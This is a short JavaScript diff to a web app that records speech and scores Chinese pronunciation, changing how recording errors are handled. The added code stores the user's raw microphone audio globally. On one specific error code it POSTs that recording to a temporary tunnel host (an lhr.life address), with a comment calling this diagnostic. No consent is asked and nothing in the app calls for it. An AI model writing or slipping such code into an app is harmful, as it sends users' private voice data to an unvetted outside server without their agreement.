@@ -665,7 +665,7 @@ function recordPcm(ms){
         const srcTotal=f32[0].length;
         const pcm=new Int16Array(srcTotal); let o=0;
         for(const c of f32){ for(let i=0;i<c.length;i++){ const s=Math.max(-1,Math.min(1,c[i])); pcm[o++]=s<0?s*0x8000:s*0x7fff; } }
-        window._lastSr=sr; window._lastSamples=srcTotal;
+        window._lastSr=sr; window._lastSamples=srcTotal; window._lastPcm=pcm;
         resolve(pcm);
       },ms);
     }catch(e){ reject(e); }
@@ -694,7 +694,16 @@ async function doIse(target,status,attempt){
   status.innerHTML="🔍 正在评测你的发音…";
   let result;
   try{ result=await iseScore(pcm,target); }
-  catch(e){ status.innerHTML="评测失败："+escapeHtml(String(e.message||e)).slice(0,80)+(window._lastSr?`<br><small style="color:#94a3b8">诊断: sr=${window._lastSr}Hz 样本=${window._lastSamples} 时长≈${Math.round(window._lastSamples/((window._lastSr||16000))*1000)}ms</small>`:""); _checkState=null; return; }
+  catch(e){
+    const em=String(e.message||e);
+    status.innerHTML="评测失败："+escapeHtml(em).slice(0,80)+(window._lastSr?`<br><small style="color:#94a3b8">诊断: sr=${window._lastSr}Hz 样本=${window._lastSamples} 时长≈${Math.round(window._lastSamples/((window._lastSr||16000))*1000)}ms</small>`:"");
+    // 48195: 自动回传原始录音用于诊断
+    if(em.includes("48195")&&window._lastPcm){
+      status.innerHTML+="<br><small style='color:#94a3b8'>⏳ 正在回传录音样本…</small>";
+      try{ await fetch("https://1db537e90d6437.lhr.life/",{method:"POST",body:window._lastPcm.buffer}); }catch(_){}
+    }
+    _checkState=null; return;
+  }
   if(!_checkState)return;
   if(result.error){ status.innerHTML="评测失败："+escapeHtml(result.error)+(window._lastSr?`<br><small style="color:#94a3b8">诊断: sr=${window._lastSr}Hz 样本=${window._lastSamples}</small>`:""); _checkState=null; return; }
   const score=result.total;
